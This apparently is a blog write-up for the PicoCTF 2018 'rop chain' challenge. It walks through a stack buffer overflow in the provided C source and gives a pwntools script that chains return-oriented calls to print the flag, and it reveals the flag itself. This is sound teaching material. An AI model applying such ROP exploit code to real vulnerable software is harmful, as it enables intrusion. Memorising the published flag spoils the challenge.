---
layout: post
title: Binary Exploitation - rop chain (350) - PicoCTF 2018
categories: [general, CTFs, Binary Exploitation]
tags: [CTFs, picoCTF2018, Binary Exploitation]
comments: true
---

Running the binary gives us the following output :
```text
Enter your input>
```
Out of an instinct I checked right away for either a buffer overflow or a format string vulnerability. 
```text
Enter your input> AAAAAAAAAAAAAAAAAAAAAAAAAAa
Segmentation fault (core dumped)
```
Okay, so it turns out there is a BoF (no format string).
Let's check for protections with `checksec.sh`:
```text
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Apparently there is a NX bit enabled, meaning we cannot use BoF to write shell-code on the stack and execute it. However, as the name of the challenge implies, we can use the **ROP** (Return Orientated Programming) technique to overcome this protection. 
ROP technique allows an attacker who has control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine's memory, called "gadgets", as each gadget ends with a return instruction.
* You can read more about ROP in this article of CTF101 - [ROP - CTF101](https://ctf101.org/binary-exploitation/return-oriented-programming/).

Anyway, We're going to need to investigate further, and examine the source code is a good place to start.
* Note that in this write-up I'll use the `rop.c` file that was given for simplicity purposes. I do recommend to try use GDB or and other disassembler to analyze the binary before taking a look at the source code.

## Examine The Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFSIZE 16

bool win1 = false;
bool win2 = false;


void win_function1() {
  win1 = true;
}

void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
  }
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```
Looking at `vuln` we can immediately see that the BoF is caused due to the usage of `gets` function, which doesn't have any length check.
The most interesting function is probably `flag`, which in the beginning of it we can see that the flag is been extracted from `flag.txt`, but it'll be printed out only if the following is true:

|Conditions|
|---|
|win1 == True / 1|
|win2 == True / 1|
|arg_check2 == `0xDEADBAAD`|


So in order to fulfill the first condition we need to jump to `win1_function`, and in order to fulfill the second condition we need to jump to `win2_function`passing the value `0xBAAAAAAD` as its argument, and that's only after `win1_function` was executed.
After that we are going to need to jump right to `flag` and pass it the value `0xDEADBAAD` as an argument. 

To accomplish all of that we can use the ROP technique.
The fact we have a BoF vulnerability allows us to overwrite the return address and what's beyond that to chain several ROP gadgets together (in this case our "gadgets" are`win1/win2_function` and `flag`) resulting in several fake function stack frames. That would cause the program to jump from one function to another in the right order so all conditions are fulfilled.
 
Based on what said above, we want the stack to look like the following when returning from `vuln`:

|Before|
|---|
|**Lower Memory Addresses**|
|vuln's return address|
|something|
|something|
|something|
|something|
|**Higher Memory Addresses**|

** **

|After|
|---|
|**Lower Memory Addresses**|
|win1_function's address|
|win2_function's address|
|flag's address|
|0xBAAAAAAD|
|0xDEADBAAD|
|**Higher Memory Addresses**|

# The Script
```python
from pwn import *

win_function1 = 0x080485cb
win_function2 = 0x080485d8
flag_function = 0x0804862b


def handle_logic():
	r.recvuntil(">")
	payload = "A"*28
	payload += p32(win_function1)
	payload += p32(win_function2)
	payload += p32(flag_function)
	payload += p32(int("0xbaaaaaad", 16))
	payload += p32(int("0xdeadbaad", 16))
	r.sendline(payload)

if __name__ == "__main__":
	r = process(['/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'])
	handle_logic()
	r.interactive()
```

Flag - `picoCTF{rOp_aInT_5o_h4Rd_R1gHt_9853cfde}`
